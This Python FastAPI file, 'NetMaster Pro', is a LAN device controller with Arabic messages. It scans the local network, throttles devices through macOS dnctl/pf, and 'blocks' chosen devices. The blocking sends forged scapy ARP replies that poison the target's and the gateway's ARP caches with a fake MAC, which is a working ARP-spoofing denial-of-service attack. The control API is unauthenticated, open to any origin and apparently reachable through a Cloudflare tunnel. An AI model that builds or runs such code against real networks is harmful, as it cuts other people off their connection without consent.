#!/usr/bin/env python3
"""
NetMaster Pro v3.0 - Real Network Controller with Bandwidth Throttling
Uses macOS dnctl (dummynet) + pf for REAL speed limiting
Uses ARP spoofing via scapy for device blocking
"""

import os
import sys
import time
import socket
import subprocess
import threading
import json
import re
from typing import Dict, List, Optional
from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel

app = FastAPI(title="NetMaster Pro v3.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Shared State
DEVICES: Dict[str, dict] = {}
BLOCKED_IPS: set = set()
THROTTLED_IPS: Dict[str, int] = {}  # ip -> rate limit (kbps)
SCANNING = False
GATEWAY_IP = "192.168.1.1"
GATEWAY_MAC = ""
MY_IP = "192.168.1.104"
MY_INTERFACE = "en0"
IS_ROOT = (os.geteuid() == 0 if hasattr(os, "geteuid") else False)

# dummynet pipe tracking: ip -> pipe_number
PIPE_MAP: Dict[str, int] = {}
NEXT_PIPE = 100  # Start pipe numbering at 100

# Detect Gateway & Interface
def detect_network_info():
    global GATEWAY_IP, MY_INTERFACE, MY_IP, GATEWAY_MAC
    try:
        res = subprocess.check_output(["route", "-n", "get", "default"]).decode()
        for line in res.splitlines():
            line = line.strip()
            if line.startswith("gateway:"):
                GATEWAY_IP = line.split(":", 1)[1].strip()
            elif line.startswith("interface:"):
                MY_INTERFACE = line.split(":", 1)[1].strip()
        
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((GATEWAY_IP, 80))
        MY_IP = s.getsockname()[0]
        s.close()
    except Exception as e:
        print(f"[!] Error detecting default route: {e}")

detect_network_info()
print(f"[*] Gateway: {GATEWAY_IP} | My IP: {MY_IP} | Interface: {MY_INTERFACE} | Root: {IS_ROOT}")

# ─── PF / DUMMYNET BANDWIDTH CONTROL ───────────────────────────────
PF_ANCHOR = "netmaster"
PF_CONF = "/tmp/netmaster_pf.conf"

def init_pf():
    """Initialize pf anchor for NetMaster"""
    if not IS_ROOT:
        print("[!] Not root - bandwidth throttling will be simulated only")
        return
    try:
        # Check if pf is enabled
        result = subprocess.run(["pfctl", "-s", "info"], capture_output=True, text=True)
        if "Disabled" in result.stdout:
            subprocess.run(["pfctl", "-e"], capture_output=True, text=True)
            print("[*] pf firewall enabled")
        
        # Add our anchor to main pf if not already there
        rules = subprocess.run(["pfctl", "-s", "rules"], capture_output=True, text=True).stdout
        if f'anchor "{PF_ANCHOR}"' not in rules:
            # Load anchor
            subprocess.run(
                ["pfctl", "-f", "/etc/pf.conf"],
                capture_output=True, text=True
            )
        print("[*] pf anchor initialized")
    except Exception as e:
        print(f"[!] pf init error: {e}")

def apply_throttle_dnctl(ip: str, rate_kbps: int):
    """Apply real bandwidth throttling using dnctl (dummynet) pipes"""
    global NEXT_PIPE
    if not IS_ROOT:
        print(f"[!] Cannot apply dnctl pipe without root for {ip}")
        return False
    
    try:
        # Allocate pipe numbers (one for download, one for upload)
        if ip not in PIPE_MAP:
            PIPE_MAP[ip] = NEXT_PIPE
            NEXT_PIPE += 2
        
        pipe_num = PIPE_MAP[ip]
        pipe_up = pipe_num + 1
        
        # Create dummynet pipes with bandwidth limit
        # Download pipe
        subprocess.run(
            ["dnctl", "pipe", str(pipe_num), "config", "bw", f"{rate_kbps}Kbit/s", "queue", "20"],
            capture_output=True, text=True, check=True
        )
        # Upload pipe (same limit)
        subprocess.run(
            ["dnctl", "pipe", str(pipe_up), "config", "bw", f"{rate_kbps}Kbit/s", "queue", "20"],
            capture_output=True, text=True, check=True
        )
        
        # Write pf rules to route traffic through pipes
        _rebuild_pf_rules()
        
        print(f"[✓] Throttle applied: {ip} → {rate_kbps} Kbps (pipes {pipe_num}/{pipe_up})")
        return True
    except Exception as e:
        print(f"[!] dnctl error for {ip}: {e}")
        return False

def remove_throttle_dnctl(ip: str):
    """Remove bandwidth throttling for a device"""
    if not IS_ROOT:
        return
    try:
        if ip in PIPE_MAP:
            pipe_num = PIPE_MAP[ip]
            pipe_up = pipe_num + 1
            subprocess.run(["dnctl", "pipe", "delete", str(pipe_num)], capture_output=True)
            subprocess.run(["dnctl", "pipe", "delete", str(pipe_up)], capture_output=True)
            del PIPE_MAP[ip]
            _rebuild_pf_rules()
            print(f"[✓] Throttle removed: {ip}")
    except Exception as e:
        print(f"[!] Error removing throttle for {ip}: {e}")

def _rebuild_pf_rules():
    """Rebuild all pf dummynet rules from current PIPE_MAP"""
    if not IS_ROOT:
        return
    try:
        rules = []
        for ip, pipe_num in PIPE_MAP.items():
            pipe_up = pipe_num + 1
            # Download: traffic TO the device
            rules.append(f"dummynet-anchor \"pipe{pipe_num}\" in quick on {MY_INTERFACE} from any to {ip} pipe {pipe_num}")
            # Upload: traffic FROM the device
            rules.append(f"dummynet-anchor \"pipe{pipe_up}\" in quick on {MY_INTERFACE} from {ip} to any pipe {pipe_up}")
        
        # Write pf rules
        with open(PF_CONF, "w") as f:
            f.write("\n".join(rules) + "\n")
        
        # Also write simpler rules if the dummynet-anchor approach fails
        simple_rules = []
        for ip, pipe_num in PIPE_MAP.items():
            pipe_up = pipe_num + 1
            simple_rules.append(f"pass in quick on {MY_INTERFACE} from any to {ip} dnpipe {pipe_num}")
            simple_rules.append(f"pass out quick on {MY_INTERFACE} from {ip} to any dnpipe {pipe_up}")
        
        with open(PF_CONF, "w") as f:
            f.write("\n".join(simple_rules) + "\n")
        
        # Load into pf anchor
        subprocess.run(
            ["pfctl", "-a", PF_ANCHOR, "-f", PF_CONF],
            capture_output=True, text=True
        )
    except Exception as e:
        print(f"[!] pf rebuild error: {e}")

def cleanup_all_throttles():
    """Clean up all pipes and pf rules on exit"""
    if not IS_ROOT:
        return
    try:
        for ip in list(PIPE_MAP.keys()):
            remove_throttle_dnctl(ip)
        subprocess.run(["pfctl", "-a", PF_ANCHOR, "-F", "all"], capture_output=True)
        subprocess.run(["dnctl", "-q", "flush"], capture_output=True)
        print("[*] All throttles cleaned up")
    except Exception:
        pass

# ─── VENDOR CACHE ──────────────────────────────────────────────────
VENDOR_CACHE = {
    "5c:e9:31": "راوتر تي بي لينك (TP-Link Router)",
    "00:b5:d0": "سامسونج جالاكسي (Samsung Galaxy)",
    "9c:6b:72": "موبايل ريلمي (Realme Smartphone)",
    "f2:e2:a8": "لابتوب أبل ماك (هذا الماك)",
    "9e:55:7b": "أبل آيفون / آيباد (Apple iPhone)",
    "56:51:10": "موبايل شاومي / أندرويد (Xiaomi / Android)",
    "16:61:c8": "هاتف أندرويد ذكي (Android Phone)",
    "3c:22:fb": "جهاز أبل (Apple Device)",
    "00:ec:0a": "شاومي ريدمي (Xiaomi Redmi)",
    "64:09:80": "شاومي (Xiaomi Device)",
    "c4:0b:cb": "أوبو / ريلمي (Oppo / Realme)",
    "40:40:a7": "سامسونج (Samsung Device)",
    "dc:a6:32": "راسبيري باي (Raspberry Pi)",
}

# Custom device names storage
CUSTOM_NAMES_FILE = os.path.join(os.path.dirname(__file__), "custom_names.json")
CUSTOM_NAMES = {}

def load_custom_names():
    global CUSTOM_NAMES
    try:
        if os.path.exists(CUSTOM_NAMES_FILE):
            with open(CUSTOM_NAMES_FILE, "r", encoding="utf-8") as f:
                CUSTOM_NAMES = json.load(f)
    except Exception as e:
        print(f"[!] Error loading custom names: {e}")

def save_custom_names():
    try:
        with open(CUSTOM_NAMES_FILE, "w", encoding="utf-8") as f:
            json.dump(CUSTOM_NAMES, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"[!] Error saving custom names: {e}")

load_custom_names()

def normalize_mac_prefix(mac: str) -> str:
    mac_clean = mac.lower().replace("-", ":")
    parts = mac_clean.split(":")[:3]
    return ":".join(p.zfill(2) for p in parts)

def resolve_vendor(mac: str) -> str:
    prefix = normalize_mac_prefix(mac)
    if prefix in VENDOR_CACHE:
        return VENDOR_CACHE[prefix]
    try:
        first_byte = int(prefix.split(":")[0], 16)
        if first_byte & 2:
            return "هاتف ذكي حديث (Private Wi-Fi Address)"
    except Exception:
        pass
    return "جهاز متصل بالشبكة"

def resolve_hostname(ip: str, mac: str = "") -> str:
    if ip in CUSTOM_NAMES:
        return CUSTOM_NAMES[ip]
    if mac and mac in CUSTOM_NAMES:
        return CUSTOM_NAMES[mac]
    if ip == GATEWAY_IP:
        return "راوتر تي بي لينك الرئيسي (TP-Link VX220-G2v)"
    if ip == MY_IP:
        return "لابتوب أبل ماك (هذا الماك)"
    if mac:
        prefix = normalize_mac_prefix(mac)
        if prefix in VENDOR_CACHE:
            return VENDOR_CACHE[prefix]
    try:
        host, _, _ = socket.gethostbyaddr(ip)
        return host
    except Exception:
        return f"هاتف ذكي ({ip.split('.')[-1]})"

# ─── NETWORK SCANNING ──────────────────────────────────────────────
def scan_network_worker():
    global SCANNING, GATEWAY_MAC
    SCANNING = True
    print("[*] Starting fast network sweep...")
    
    subnet_prefix = ".".join(GATEWAY_IP.split(".")[:3])
    def ping_host(host_ip):
        subprocess.run(["ping", "-c", "1", "-W", "200", host_ip],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    threads = []
    for i in range(1, 255):
        ip = f"{subnet_prefix}.{i}"
        t = threading.Thread(target=ping_host, args=(ip,))
        threads.append(t)
        t.start()
        if len(threads) >= 60:
            for th in threads:
                th.join()
            threads = []
    for th in threads:
        th.join()

    try:
        if os.path.exists("/tmp/netmaster_arp.txt") and os.path.getsize("/tmp/netmaster_arp.txt") > 0:
            with open("/tmp/netmaster_arp.txt", "r") as f:
                lines = f.readlines()
        else:
            lines = subprocess.check_output(["/usr/sbin/arp", "-a"]).decode().splitlines()

        for line in lines:
            if "(incomplete)" in line or MY_INTERFACE not in line:
                continue

            match = re.search(r"\(([\d\.]+)\)\s+at\s+([0-9a-fA-F:]+)", line)
            if match:
                ip = match.group(1)
                mac = match.group(2).lower()

                if ip.startswith("224.") or ip.startswith("239.") or mac == "ff:ff:ff:ff:ff:ff":
                    continue

                if ip == GATEWAY_IP:
                    GATEWAY_MAC = mac

                vendor = resolve_vendor(mac)
                hostname = resolve_hostname(ip, mac)

                latency = 1.0
                try:
                    p = subprocess.run(["ping", "-c", "1", "-W", "150", ip],
                                       stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
                    m = re.search(r"time=([\d\.]+)\s*ms", p.stdout)
                    if m:
                        latency = round(float(m.group(1)), 1)
                except Exception:
                    pass

                status = "online"
                if ip in BLOCKED_IPS:
                    status = "blocked"
                elif ip in THROTTLED_IPS:
                    status = "throttled"

                DEVICES[ip] = {
                    "ip": ip,
                    "mac": mac,
                    "hostname": hostname,
                    "vendor": vendor,
                    "latency": latency,
                    "is_gateway": (ip == GATEWAY_IP),
                    "is_me": (ip == MY_IP),
                    "status": status,
                    "speed_limit": THROTTLED_IPS.get(ip, None),
                    "last_seen": time.time(),
                }
    except Exception as e:
        print(f"[!] Error parsing ARP: {e}")

    SCANNING = False
    print(f"[*] Scan completed. Found {len(DEVICES)} devices.")

# ─── ARP SPOOFING (BLOCK ONLY) ─────────────────────────────────────
def arp_control_loop():
    try:
        from scapy.all import ARP, send, conf
        conf.verb = 0
    except ImportError:
        print("[!] Scapy not loaded. Install: pip install scapy")
        return

    while True:
        try:
            if not IS_ROOT and BLOCKED_IPS:
                print("[!] Root required for ARP injection. Run with sudo.")
                time.sleep(5.0)
                continue

            conf.iface = MY_INTERFACE

            # Only handle BLOCKED devices via ARP spoofing
            for ip in list(BLOCKED_IPS):
                if ip in DEVICES and GATEWAY_MAC:
                    target_mac = DEVICES[ip]["mac"]
                    pkt1 = ARP(op=2, pdst=ip, hwdst=target_mac, psrc=GATEWAY_IP, hwsrc="00:00:00:00:00:01")
                    pkt2 = ARP(op=2, pdst=GATEWAY_IP, hwdst=GATEWAY_MAC, psrc=ip, hwsrc="00:00:00:00:00:01")
                    send(pkt1, count=3, inter=0.05, verbose=False)
                    send(pkt2, count=3, inter=0.05, verbose=False)

            time.sleep(0.3 if BLOCKED_IPS else 2.0)
        except Exception as e:
            print(f"[!] ARP loop error: {e}")
            time.sleep(3.0)

def restore_arp(target_ip: str):
    try:
        from scapy.all import ARP, send, conf
        conf.verb = 0
        conf.iface = MY_INTERFACE
        if target_ip in DEVICES and GATEWAY_MAC:
            target_mac = DEVICES[target_ip]["mac"]
            pkt1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=GATEWAY_IP, hwsrc=GATEWAY_MAC)
            pkt2 = ARP(op=2, pdst=GATEWAY_IP, hwdst=GATEWAY_MAC, psrc=target_ip, hwsrc=target_mac)
            send(pkt1, count=8, inter=0.05, verbose=False)
            send(pkt2, count=8, inter=0.05, verbose=False)
    except Exception as e:
        print(f"[!] Error restoring ARP: {e}")

# Start background threads
threading.Thread(target=arp_control_loop, daemon=True).start()

# ─── API ENDPOINTS ──────────────────────────────────────────────────
class BlockRequest(BaseModel):
    ip: str

class ThrottleRequest(BaseModel):
    ip: str
    rate_kbps: int

@app.get("/api/info")
def get_info():
    return {
        "gateway_ip": GATEWAY_IP,
        "gateway_mac": GATEWAY_MAC,
        "router_model": "TP-Link VX220-G2v (AX1500)",
        "my_ip": MY_IP,
        "interface": MY_INTERFACE,
        "scanning": SCANNING,
        "device_count": len(DEVICES),
        "blocked_count": len(BLOCKED_IPS),
        "throttled_count": len(THROTTLED_IPS),
        "is_root": IS_ROOT
    }

@app.get("/api/devices")
def get_devices():
    return list(DEVICES.values())

@app.post("/api/scan")
def trigger_scan():
    global SCANNING
    if not SCANNING:
        threading.Thread(target=scan_network_worker, daemon=True).start()
        return {"status": "started", "message": "جارٍ مسح الشبكة واكتشاف الأجهزة..."}
    return {"status": "busy", "message": "عملية المسح جارية بالفعل"}

@app.post("/api/block")
def block_device(req: BlockRequest):
    if req.ip == GATEWAY_IP or req.ip == MY_IP:
        raise HTTPException(status_code=400, detail="لا يمكن قطع الاتصال عن الراوتر أو جهازك الحالي")
    
    # Remove throttle if exists
    if req.ip in THROTTLED_IPS:
        remove_throttle_dnctl(req.ip)
        del THROTTLED_IPS[req.ip]
    
    BLOCKED_IPS.add(req.ip)
    if req.ip in DEVICES:
        DEVICES[req.ip]["status"] = "blocked"
        DEVICES[req.ip]["speed_limit"] = None
    
    if not IS_ROOT:
        return {
            "status": "warning",
            "message": f"⚠️ تم وضع {req.ip} في قائمة الحظر لكن يتطلب تشغيل بـ sudo.\nشغّل: sudo ./run.sh"
        }
    return {"status": "ok", "message": f"✅ تم قطع النت عن الجهاز {req.ip} فوراً"}

@app.post("/api/unblock")
def unblock_device(req: BlockRequest):
    if req.ip in BLOCKED_IPS:
        BLOCKED_IPS.remove(req.ip)
    if req.ip in THROTTLED_IPS:
        remove_throttle_dnctl(req.ip)
        del THROTTLED_IPS[req.ip]
    if req.ip in DEVICES:
        DEVICES[req.ip]["status"] = "online"
        DEVICES[req.ip]["speed_limit"] = None
    restore_arp(req.ip)
    return {"status": "ok", "message": f"✅ تمت إعادة النت للجهاز {req.ip}"}

@app.post("/api/throttle")
def throttle_device(req: ThrottleRequest):
    if req.ip == GATEWAY_IP or req.ip == MY_IP:
        raise HTTPException(status_code=400, detail="لا يمكن تقييد سرعة الراوتر أو جهازك الحالي")
    
    # Remove block if exists
    if req.ip in BLOCKED_IPS:
        BLOCKED_IPS.remove(req.ip)
        restore_arp(req.ip)
    
    THROTTLED_IPS[req.ip] = req.rate_kbps
    if req.ip in DEVICES:
        DEVICES[req.ip]["status"] = "throttled"
        DEVICES[req.ip]["speed_limit"] = req.rate_kbps
    
    # Apply REAL bandwidth limit
    success = apply_throttle_dnctl(req.ip, req.rate_kbps)
    
    if not IS_ROOT:
        return {
            "status": "warning",
            "message": f"⚠️ تم تعيين حد {req.rate_kbps} Kbps لكن يتطلب sudo.\nشغّل: sudo ./run.sh"
        }
    
    if success:
        return {"status": "ok", "message": f"✅ تم تحديد سرعة {req.ip} إلى {req.rate_kbps} Kbps فعلياً!"}
    else:
        return {"status": "error", "message": f"❌ فشل تطبيق تحديد السرعة على {req.ip}"}

class RenameRequest(BaseModel):
    ip: str
    custom_name: str

@app.post("/api/rename")
def rename_device(req: RenameRequest):
    CUSTOM_NAMES[req.ip] = req.custom_name.strip()
    if req.ip in DEVICES:
        DEVICES[req.ip]["hostname"] = req.custom_name.strip()
        if DEVICES[req.ip].get("mac"):
            CUSTOM_NAMES[DEVICES[req.ip]["mac"]] = req.custom_name.strip()
    save_custom_names()
    return {"status": "ok", "message": f"✅ تم تغيير اسم الجهاز إلى: {req.custom_name}"}

@app.get("/api/tunnel_url")
def get_tunnel_url():
    """Return the current Cloudflare tunnel URL"""
    try:
        if os.path.exists("/tmp/cloudflared.log"):
            with open("/tmp/cloudflared.log", "r") as f:
                content = f.read()
            urls = re.findall(r'https://[a-zA-Z0-9.-]+\.trycloudflare\.com', content)
            if urls:
                return {"url": urls[-1]}
    except Exception:
        pass
    return {"url": ""}

# Serve Frontend
@app.get("/", response_class=HTMLResponse)
def get_index():
    # Try static/ first, then root
    for path in [
        os.path.join(os.path.dirname(__file__), "static", "index.html"),
        os.path.join(os.path.dirname(__file__), "index.html"),
    ]:
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8") as f:
                return f.read()
    return "<h1>NetMaster Dashboard Loading...</h1>"

@app.on_event("startup")
def startup_event():
    init_pf()
    threading.Thread(target=scan_network_worker, daemon=True).start()

@app.on_event("shutdown")
def shutdown_event():
    cleanup_all_throttles()

if __name__ == "__main__":
    import uvicorn
    import atexit
    atexit.register(cleanup_all_throttles)
    uvicorn.run(app, host="0.0.0.0", port=8080)
